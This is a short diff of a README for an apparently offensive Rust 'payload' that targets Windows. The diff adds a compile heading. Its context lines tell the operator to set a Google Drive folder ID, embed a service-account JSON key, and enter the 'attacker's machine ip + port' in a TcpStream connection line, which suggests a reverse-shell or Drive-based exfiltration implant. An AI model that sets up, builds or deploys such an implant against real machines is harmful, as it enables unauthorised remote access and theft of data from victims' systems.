@@ -19,6 +19,7 @@ Before compiling, on src/main.rs in payload folder, change this:
 - folder ID on ``` const FOLDER_ID: &str = "INPUT YOUR GGDRIVE ID"; ```
 - drop your json file in /src and put your json name in ```let service_account_json = include_str!("yourjsonfilename.json");```
 - your attacker's machine ip + port number at ```let mut stream = TcpStream::connect("192.168.247.131:4444").expect("Failed to connect");```
+# Compiling Rust payload
 To compile the Rust payload, follow these steps:
 ```
 # Build for a Windows target
